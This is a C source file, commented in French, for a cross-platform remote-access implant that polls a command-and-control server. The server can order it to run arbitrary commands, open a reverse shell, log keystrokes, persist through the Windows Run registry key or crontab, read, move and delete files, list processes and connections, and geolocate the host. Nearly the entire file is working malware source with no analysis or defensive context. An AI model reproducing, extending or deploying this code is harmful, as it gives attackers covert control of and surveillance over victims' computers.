#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#ifdef _WIN32
    #define OS "WINDOWS"
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <psapi.h>
    #include <tlhelp32.h>    // Pour CreateToolhelp32Snapshot, PROCESSENTRY32, etc.
    #include <iphlpapi.h>    // Pour GetTcpTable2, MIB_TCPTABLE2, etc.
#else
    #define OS "LINUX"
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <signal.h>
    #include <dirent.h>
    #include <linux/input.h>
    #include <pthread.h>
    #include <pwd.h>
#endif
#include <curl/curl.h>
#include <json-c/json.h>
#include <ctype.h>
#ifdef _WIN32
    #define SLEEP_SECONDS(s) Sleep((s) * 1000)
#else
    #define SLEEP_SECONDS(s) sleep(s)
#endif

// Variables globales pour le keylogger
#ifdef _WIN32
static HHOOK hHook = NULL;
static FILE *keylogger_file = NULL;
static int keylogger_running = 0;
#else
static int keylogger_fd = -1;
static FILE *keylogger_file = NULL;
static pthread_t keylogger_thread;
static int keylogger_running = 0;
#endif

// Callback pour récupérer la réponse HTTP
size_t write_callback(void *contents, size_t size, size_t nmemb, char *buffer) {
    size_t realsize = size * nmemb;
    strncat(buffer, (char *)contents, realsize);
    return realsize;
}

// Nettoyer une chaîne
void clean_string(char *str) {
    for (size_t i = 0; str[i] != '\0'; i++) {
        if (str[i] == '\n' || str[i] == '\r') str[i] = ' ';
    }
}

// Encoder en base64
static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
char *base64_encode(const char *input) {
    size_t input_len = strlen(input);
    size_t output_len = 4 * ((input_len + 2) / 3);
    char *encoded = malloc(output_len + 1);
    if (!encoded) return NULL;

    size_t i, j;
    for (i = 0, j = 0; i < input_len;) {
        uint32_t octet_a = i < input_len ? (unsigned char)input[i++] : 0;
        uint32_t octet_b = i < input_len ? (unsigned char)input[i++] : 0;
        uint32_t octet_c = i < input_len ? (unsigned char)input[i++] : 0;

        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;

        encoded[j++] = base64_table[(triple >> 18) & 0x3F];
        encoded[j++] = base64_table[(triple >> 12) & 0x3F];
        encoded[j++] = base64_table[(triple >> 6) & 0x3F];
        encoded[j++] = base64_table[triple & 0x3F];
    }

    if (input_len % 3 == 1) {
        encoded[j - 2] = '=';
        encoded[j - 1] = '=';
    } else if (input_len % 3 == 2) {
        encoded[j - 1] = '=';
    }
    encoded[j] = '\0';
    return encoded;
}

// Exécuter une commande
char *execute_command(const char *cmd) {
    char buffer[8192] = {0};
    size_t buffer_len = 0;
    FILE *fp;
#ifdef _WIN32
    fp = _popen(cmd, "r");
#else
    fp = popen(cmd, "r");
#endif
    if (!fp) return strdup("Erreur : impossible d'exécuter la commande");

    while (fgets(buffer + buffer_len, sizeof(buffer) - buffer_len, fp)) {
        buffer_len = strlen(buffer);
    }
#ifdef _WIN32
    _pclose(fp);
#else
    pclose(fp);
#endif
    clean_string(buffer);
    return strdup(buffer);
}

// Lire un fichier
char *read_file(const char *filepath) {
    FILE *fp = fopen(filepath, "r");
    if (!fp) return strdup("Erreur : impossible d'ouvrir le fichier");

    char buffer[8192] = {0};
    size_t buffer_len = 0;
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        strncat(buffer, line, sizeof(buffer) - buffer_len - 1);
        buffer_len = strlen(buffer);
    }
    fclose(fp);
    clean_string(buffer);
    return strdup(buffer);
}

// Lister les processus
char *list_processes() {
    char buffer[8192] = {0};
    size_t offset = 0;

    offset += snprintf(buffer + offset, sizeof(buffer) - offset,
                      "USER       PID %%CPU %%MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n");

#ifdef _WIN32
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return strdup("Erreur : impossible de lister les processus");

    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hProcessSnap, &pe32)) {
        do {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
            char user[32] = "unknown";
            char cmdline[256] = {0};
            if (hProcess) {
                strcpy(user, "SYSTEM"); // Simplifié
                HMODULE hMod;
                DWORD cbNeeded;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                    GetModuleBaseNameA(hProcess, hMod, cmdline, sizeof(cmdline));
                }
                CloseHandle(hProcess);
            }
            offset += snprintf(buffer + offset, sizeof(buffer) - offset,
                              "%-8s %5lu %4.1f %4.1f %6lu %5lu %-7s %c    %5s %7s %s\n",
                              user, pe32.th32ProcessID, 0.0, 0.0, 0, 0, "?", 'R', "00:00", "0:00", cmdline);
        } while (Process32Next(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
#else
    DIR *dir = opendir("/proc");
    if (!dir) return strdup("Erreur : impossible d'ouvrir /proc");

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (!isdigit(*entry->d_name)) continue;

        char path[PATH_MAX];
        char line[1024];
        FILE *fp;
        pid_t pid = atoi(entry->d_name);
        char comm[256] = {0};
        char state = ' ';
        long utime = 0, stime = 0;
        unsigned long vsize = 0, rss = 0;
        char tty[32] = "?";
        char start[16] = "00:00";
        char user[32] = "unknown";

        snprintf(path, sizeof(path), "/proc/%s/stat", entry->d_name);
        fp = fopen(path, "r");
        if (fp) {
            if (fgets(line, sizeof(line), fp)) {
                char *p = line;
                int field = 0;
                while (field < 23 && p) {
                    if (field == 2) state = p[1];
                    if (field == 13) utime = atol(p);
                    if (field == 14) stime = atol(p);
                    if (field == 23) vsize = atol(p);
                    if (field == 24) rss = atol(p);
                    p = strchr(p, ' ');
                    if (p) p++;
                    field++;
                }
            }
            fclose(fp);
        }

        snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
        fp = fopen(path, "r");
        if (fp) {
            fgets(comm, sizeof(comm), fp);
            comm[strcspn(comm, "\n")] = 0;
            fclose(fp);
        }

        struct stat statbuf;
        snprintf(path, sizeof(path), "/proc/%s", entry->d_name);
        if (stat(path, &statbuf) == 0) {
            struct passwd *pw = getpwuid(statbuf.st_uid);
            if (pw) strncpy(user, pw->pw_name, sizeof(user) - 1);
        }

        long total_time = (utime + stime) / sysconf(_SC_CLK_TCK);
        long minutes = total_time / 60;
        long seconds = total_time % 60;
        char time_str[32];
        snprintf(time_str, sizeof(time_str), "%ld:%02ld", minutes, seconds);

        float mem_percent = (rss * sysconf(_SC_PAGESIZE)) / (float)sysconf(_SC_PHYS_PAGES) * 100;

        offset += snprintf(buffer + offset, sizeof(buffer) - offset,
                          "%-8s %5d %4.1f %4.1f %6lu %5lu %-7s %c    %5s %7s %s\n",
                          user, pid, 0.0, mem_percent, vsize, rss, tty, state, start, time_str, comm);
    }
    closedir(dir);
#endif
    clean_string(buffer);
    return strdup(buffer);
}

// Lister les sockets
char *list_sockets() {
    char buffer[8192] = {0};
    size_t offset = 0;

    offset += snprintf(buffer + offset, sizeof(buffer) - offset,
                       "Proto Recv-Q Send-Q Local Address           Foreign Address         State\n");

#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return strdup("Erreur : échec de Winsock");

    PMIB_TCPTABLE2 pTcpTable = (MIB_TCPTABLE2 *)malloc(sizeof(MIB_TCPTABLE2));
    ULONG ulSize = 0;
    if (GetTcpTable2(pTcpTable, &ulSize, TRUE) == ERROR_INSUFFICIENT_BUFFER) {
        free(pTcpTable);
        pTcpTable = (MIB_TCPTABLE2 *)malloc(ulSize);
    }
    if (GetTcpTable2(pTcpTable, &ulSize, TRUE) == NO_ERROR) {
        for (DWORD i = 0; i < pTcpTable->dwNumEntries; i++) {
            char local_str[INET_ADDRSTRLEN], remote_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &pTcpTable->table[i].dwLocalAddr, local_str, sizeof(local_str));
            inet_ntop(AF_INET, &pTcpTable->table[i].dwRemoteAddr, remote_str, sizeof(remote_str));
            const char *state_str = (pTcpTable->table[i].dwState == MIB_TCP_STATE_ESTAB) ? "ESTABLISHED" :
                                    (pTcpTable->table[i].dwState == MIB_TCP_STATE_LISTEN) ? "LISTEN" : "UNKNOWN";
            offset += snprintf(buffer + offset, sizeof(buffer) - offset,
                               "tcp    0      0 %s:%u         %s:%u         %s\n",
                               local_str, ntohs((u_short)pTcpTable->table[i].dwLocalPort),
                               remote_str, ntohs((u_short)pTcpTable->table[i].dwRemotePort), state_str);
        }
    }
    free(pTcpTable);
    WSACleanup();
#else
    FILE *tcp_file = fopen("/proc/net/tcp", "r");
    if (tcp_file) {
        char line[256];
        fgets(line, sizeof(line), tcp_file);
        while (fgets(line, sizeof(line), tcp_file)) {
            unsigned int local_ip, remote_ip, port_local, port_remote, state;
            sscanf(line, "%*d: %x:%x %x:%x %x", &local_ip, &port_local, &remote_ip, &port_remote, &state);

            struct in_addr local_addr = {.s_addr = local_ip};
            struct in_addr remote_addr = {.s_addr = remote_ip};
            char local_str[INET_ADDRSTRLEN], remote_str[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &local_addr, local_str, sizeof(local_str));
            inet_ntop(AF_INET, &remote_addr, remote_str, sizeof(remote_str));

            const char *state_str;
            switch (state) {
                case 1: state_str = "ESTABLISHED"; break;
                case 10: state_str = "LISTEN"; break;
                default: state_str = "UNKNOWN"; break;
            }
            offset += snprintf(buffer + offset, sizeof(buffer) - offset,
                               "tcp    0      0 %s:%u         %s:%u         %s\n",
                               local_str, port_local, remote_str, port_remote, state_str);
        }
        fclose(tcp_file);
    }
#endif
    clean_string(buffer);
    return strdup(buffer);
}

// Récupérer la localisation
char *get_location() {
    CURL *curl = curl_easy_init();
    if (!curl) return strdup("Erreur : échec de l'initialisation de curl");

    char buffer[8192] = {0};
    curl_easy_setopt(curl, CURLOPT_URL, "http://ipinfo.io/json");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, buffer);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) return strdup("Erreur : échec de la récupération de la localisation");

    struct json_object *parsed_json = json_tokener_parse(buffer);
    if (!parsed_json) return strdup("Erreur : impossible de parser la réponse JSON");

    struct json_object *loc_field, *city_field, *country_field;
    char result[256] = {0};
    const char *loc = "unknown", *city = "unknown", *country = "unknown";

    if (json_object_object_get_ex(parsed_json, "loc", &loc_field)) loc = json_object_get_string(loc_field);
    if (json_object_object_get_ex(parsed_json, "city", &city_field)) city = json_object_get_string(city_field);
    if (json_object_object_get_ex(parsed_json, "country", &country_field)) country = json_object_get_string(country_field);

    snprintf(result, sizeof(result), "Latitude/Longitude: %s (%s, %s)", loc, city, country);
    json_object_put(parsed_json);
    return strdup(result);
}

// Reverse shell
char *send_reverse_shell(const char *lhost, int lport) {
    if (!lhost || lport <= 0 || lport > 65535) return strdup("Erreur : LHOST ou LPORT invalide");

#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return strdup("Erreur : échec de Winsock");
#endif

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server_addr = {0};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(lport);
    inet_pton(AF_INET, lhost, &server_addr.sin_addr);

    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
#ifdef _WIN32
        STARTUPINFO si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sockfd;
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
#else
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
        execl("/bin/sh", "sh", NULL);
#endif
    }
#ifdef _WIN32
    closesocket(sockfd);
    WSACleanup();
#else
    close(sockfd);
#endif
    return strdup("Reverse shell envoyé");
}

// Keylogger
#ifdef _WIN32
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT *)lParam;
        if (keylogger_file) {
            fprintf(keylogger_file, "Key: %d\n", kbStruct->vkCode);
            fflush(keylogger_file);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}
#else
void *keylogger_loop(void *arg) {
    struct input_event ev;
    while (keylogger_running) {
        ssize_t n = read(keylogger_fd, &ev, sizeof(ev));
        if (n == sizeof(ev) && ev.type == EV_KEY && ev.value == 1) {
            if (keylogger_file) {
                fprintf(keylogger_file, "Key: %d\n", ev.code);
                fflush(keylogger_file);
            }
        }
    }
    return NULL;
}
#endif

char *toggle_keylogger(const char *state, const char *filepath) {
    if (!state) return strdup("Erreur : état du keylogger non spécifié");

    if (strcmp(state, "true") == 0 || strcmp(state, "on") == 0) {
        if (keylogger_running) return strdup("Keylogger déjà activé");

#ifdef _WIN32
        hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
        if (!hHook) return strdup("Erreur : échec de l'installation du hook clavier");
        if (filepath && strcmp(filepath, "null") != 0) {
            keylogger_file = fopen(filepath, "a");
            if (!keylogger_file) {
                UnhookWindowsHookEx(hHook);
                return strdup("Erreur : impossible d'ouvrir le fichier de sortie");
            }
        }
        keylogger_running = 1;
#else
        keylogger_fd = open("/dev/input/event0", O_RDONLY);
        if (keylogger_fd < 0) return strdup("Erreur : impossible d'ouvrir /dev/input (root requis ?)");
        if (filepath && strcmp(filepath, "null") != 0) {
            keylogger_file = fopen(filepath, "a");
            if (!keylogger_file) {
                close(keylogger_fd);
                return strdup("Erreur : impossible d'ouvrir le fichier de sortie");
            }
        }
        keylogger_running = 1;
        if (pthread_create(&keylogger_thread, NULL, keylogger_loop, NULL) != 0) {
            keylogger_running = 0;
            if (keylogger_file) fclose(keylogger_file);
            close(keylogger_fd);
            return strdup("Erreur : échec de la création du thread");
        }
#endif
        char msg[256];
        snprintf(msg, sizeof(msg), "Keylogger activé%s", (filepath && strcmp(filepath, "null") != 0) ? " avec fichier" : "");
        return strdup(msg);
    } else if (strcmp(state, "false") == 0 || strcmp(state, "off") == 0) {
        if (!keylogger_running) return strdup("Keylogger déjà désactivé");

#ifdef _WIN32
        UnhookWindowsHookEx(hHook);
        if (keylogger_file) fclose(keylogger_file);
        keylogger_file = NULL;
#else
        keylogger_running = 0;
        pthread_join(keylogger_thread, NULL);
        if (keylogger_file) fclose(keylogger_file);
        close(keylogger_fd);
#endif
        keylogger_running = 0;
        return strdup("Keylogger désactivé");
    }
    return strdup("Erreur : état invalide");
}

// Chemin de l'exécutable
char *get_executable_path() {
#ifdef _WIN32
    char path[MAX_PATH];
    if (GetModuleFileName(NULL, path, MAX_PATH) == 0) return strdup("Erreur : impossible de récupérer le chemin");
    return strdup(path);
#else
    char path[PATH_MAX];
    ssize_t count = readlink("/proc/self/exe", path, PATH_MAX);
    if (count == -1) return strdup("Erreur : impossible de récupérer le chemin");
    path[count] = '\0';
    return strdup(path);
#endif
}

// Persistance
char *toggle_persistence(const char *state) {
    char *exec_path = get_executable_path();
    if (strncmp(exec_path, "Erreur", 6) == 0) return exec_path;

    if (strcmp(state, "true") == 0 || strcmp(state, "on") == 0) {
#ifdef _WIN32
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueEx(hKey, "MyImplant", 0, REG_SZ, (BYTE *)exec_path, strlen(exec_path) + 1);
            RegCloseKey(hKey);
            char result[MAX_PATH + 100];
            snprintf(result, sizeof(result), "Persistance activée (registre) avec %s", exec_path);
            free(exec_path);
            return strdup(result);
        }
#else
        char command[PATH_MAX + 50];
        snprintf(command, sizeof(command), "echo '* * * * * %s' | crontab -", exec_path);
        system(command);
        char result[PATH_MAX + 100];
        snprintf(result, sizeof(result), "Persistance activée (crontab) avec %s", exec_path);
        free(exec_path);
        return strdup(result);
#endif
    } else if (strcmp(state, "false") == 0 || strcmp(state, "off") == 0) {
#ifdef _WIN32
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValue(hKey, "MyImplant");
            RegCloseKey(hKey);
        }
#else
        system("crontab -r");
#endif
        free(exec_path);
        return strdup("Persistance désactivée");
    }
    free(exec_path);
    return strdup("Erreur : état invalide");
}

// Déplacer un fichier
char *move_file(const char *src, const char *dst) {
    if (rename(src, dst) == 0) return strdup("Fichier déplacé avec succès");
    return strdup("Erreur : impossible de déplacer le fichier");
}

// Supprimer un fichier
char *remove_file(const char *filepath) {
    if (remove(filepath) == 0) return strdup("Fichier supprimé avec succès");
    return strdup("Erreur : impossible de supprimer le fichier");
}

// Requête DECLARE
int perform_declare(CURL *curl, char *response, char *implant_uid, size_t implant_uid_size, char *username, char *hostname, char *os) {
    char json[8192];
    snprintf(json, sizeof(json), "{\"DECLARE\":{\"username\":\"%s\",\"hostname\":\"%s\",\"os\":\"%s\"}}", username, hostname, os);
    printf("JSON DECLARE envoyé : %s\n", json);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "Erreur DECLARE : %s\n", curl_easy_strerror(res));
        return 0;
    }

    printf("Réponse DECLARE : %s\n", response);

    struct json_object *parsed_json, *ok_field, *uid_field;
    parsed_json = json_tokener_parse(response);
    if (!parsed_json) {
        fprintf(stderr, "Erreur : impossible de parser la réponse JSON DECLARE\n");
        return 0;
    }

    if (json_object_object_get_ex(parsed_json, "OK", &ok_field) &&
        json_object_object_get_ex(ok_field, "UID", &uid_field)) {
        const char *uid = json_object_get_string(uid_field);
        if (uid) {
            strncpy(implant_uid, uid, implant_uid_size - 1);
            implant_uid[implant_uid_size - 1] = '\0';
            printf("Nouvel implant-uid reçu : %s\n", implant_uid);
            json_object_put(parsed_json);
            return 1;
        }
    }
    fprintf(stderr, "Erreur : échec de l'extraction de l'implant-uid\n");
    json_object_put(parsed_json);
    return 0;
}

int main() {
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "Erreur : échec de l'initialisation de Winsock\n");
        return 1;
    }
#endif

    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Erreur : échec de l'initialisation de curl\n");
        return 1;
    }

    curl_global_init(CURL_GLOBAL_ALL);
    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api");
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);

    char response[8192] = {0};
    char implant_uid[32] = {0};
    int sleep_time = 5, jitter = 2, not_found_count = 0;

    char username[32], hostname[64], os[32] = OS;
#ifdef _WIN32
    DWORD username_len = sizeof(username);
    GetUserName(username, &username_len);
    DWORD hostname_len = sizeof(hostname);
    GetComputerName(hostname, &hostname_len);
#else
    const char *user = getenv("USER");
    strncpy(username, user ? user : "unknown", sizeof(username) - 1);
    gethostname(hostname, sizeof(hostname));
#endif

    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    if (!perform_declare(curl, response, implant_uid, sizeof(implant_uid), username, hostname, os)) {
        fprintf(stderr, "Échec du DECLARE initial\n");
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
#ifdef _WIN32
        WSACleanup();
#endif
        return 1;
    }

    while (1) {
        memset(response, 0, sizeof(response));
        char json[8192];
        snprintf(json, sizeof(json), "{\"FETCH\":\"%s\"}", implant_uid);
        printf("JSON FETCH envoyé : %s\n", json);

        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "Erreur FETCH : %s\n", curl_easy_strerror(res));
            SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1))); // Utilisation de la macro
            continue;
        }

        printf("Réponse FETCH : %s\n", response);

        struct json_object *parsed_json = json_tokener_parse(response);
        if (!parsed_json) {
            fprintf(stderr, "Erreur : impossible de parser la réponse JSON FETCH\n");
            SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1))); // Utilisation de la macro
            continue;
        }

        struct json_object *error_field, *task_uid_field, *action_field;
        char *task_uid = NULL, *result = NULL;

        if (json_object_object_get_ex(parsed_json, "error", &error_field)) {
            const char *error_msg = json_object_get_string(error_field);
            printf("Erreur FETCH : %s\n", error_msg);
            if (strcmp(error_msg, "NotFound") == 0) {
                not_found_count++;
                if (not_found_count >= 50) {
                    printf("Trop d'erreurs NotFound, réessai de DECLARE...\n");
                    memset(implant_uid, 0, sizeof(implant_uid));
                    memset(response, 0, sizeof(response));
                    if (!perform_declare(curl, response, implant_uid, sizeof(implant_uid), username, hostname, os)) {
                        fprintf(stderr, "Échec du DECLARE, arrêt\n");
                        json_object_put(parsed_json);
                        curl_slist_free_all(headers);
                        curl_easy_cleanup(curl);
                        curl_global_cleanup();
#ifdef _WIN32
                        WSACleanup();
#endif
                        return 1;
                    }
                    not_found_count = 0;
                }
            }
            json_object_put(parsed_json);
            SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1))); // Utilisation de la macro
            continue;
        }

        not_found_count = 0;

        if (json_object_object_get_ex(parsed_json, "task_uid", &task_uid_field) &&
            json_object_object_get_ex(parsed_json, "action", &action_field)) {
            task_uid = strdup(json_object_get_string(task_uid_field));

            struct json_object *execve_field, *sleep_field, *locate_field, *revshell_field;
            struct json_object *keylog_field, *persist_field, *cat_field, *mv_field;
            struct json_object *rm_field, *ps_field, *netstat_field;

            if (json_object_object_get_ex(action_field, "EXECVE", &execve_field)) {
                const char *cmd = json_object_get_string(json_object_object_get(execve_field, "cmd"));
                const char *args = json_object_get_string(json_object_object_get(execve_field, "args"));
                char full_cmd[256];
                snprintf(full_cmd, sizeof(full_cmd), "%s %s", cmd, args ? args : "");
                result = execute_command(full_cmd);
            } else if (json_object_object_get_ex(action_field, "SLEEP", &sleep_field)) {
                sleep_time = json_object_get_int(json_object_object_get(sleep_field, "seconds"));
                jitter = json_object_get_int(json_object_object_get(sleep_field, "jitter"));
                // Assurer des valeurs minimales pour éviter un spam
                if (sleep_time < 1) sleep_time = 1; // Minimum 1 seconde
                if (jitter < 0) jitter = 0;         // Pas de jitter négatif
                result = strdup("Temps de sommeil mis à jour");
            } else if (json_object_object_get_ex(action_field, "LOCATE", &locate_field)) {
                result = get_location();
            } else if (json_object_object_get_ex(action_field, "REVSHELL", &revshell_field)) {
                const char *lhost = json_object_get_string(json_object_object_get(revshell_field, "host"));
                int lport = json_object_get_int(json_object_object_get(revshell_field, "port"));
                result = send_reverse_shell(lhost, lport);
            } else if (json_object_object_get_ex(action_field, "KEYLOG", &keylog_field)) {
                const char *state = json_object_get_string(json_object_object_get(keylog_field, "status"));
                const char *filepath = json_object_get_string(json_object_object_get(keylog_field, "path"));
                result = toggle_keylogger(state, filepath);
            } else if (json_object_object_get_ex(action_field, "PERSIST", &persist_field)) {
                const char *state = json_object_get_string(json_object_object_get(persist_field, "status"));
                result = toggle_persistence(state);
            } else if (json_object_object_get_ex(action_field, "CAT", &cat_field)) {
                const char *filepath = json_object_get_string(json_object_object_get(cat_field, "filepath"));
                result = read_file(filepath);
            } else if (json_object_object_get_ex(action_field, "MV", &mv_field)) {
                const char *src = json_object_get_string(json_object_object_get(mv_field, "src"));
                const char *dst = json_object_get_string(json_object_object_get(mv_field, "dst"));
                result = move_file(src, dst);
            } else if (json_object_object_get_ex(action_field, "RM", &rm_field)) {
                const char *filepath = json_object_get_string(json_object_object_get(rm_field, "filepath"));
                result = remove_file(filepath);
            } else if (json_object_object_get_ex(action_field, "PS", &ps_field)) {
                result = list_processes();
            } else if (json_object_object_get_ex(action_field, "NETSTAT", &netstat_field)) {
                result = list_sockets();
            } else {
                result = strdup("Erreur : tâche non reconnue");
            }

            if (result) {
                char *encoded_result = base64_encode(result);
                snprintf(json, sizeof(json), "{\"RESULT\":{\"agent_uid\":\"%s\",\"task_uid\":\"%s\",\"output\":\"%s\"}}",
                         implant_uid, task_uid, encoded_result);
                free(encoded_result);

                memset(response, 0, sizeof(response));
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
                res = curl_easy_perform(curl);
                if (res != CURLE_OK) fprintf(stderr, "Erreur RESULT : %s\n", curl_easy_strerror(res));
                free(result);
                free(task_uid);
            }
        }
        json_object_put(parsed_json);
        SLEEP_SECONDS(sleep_time + (rand() % (jitter + 1))); // Utilisation de la macro
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}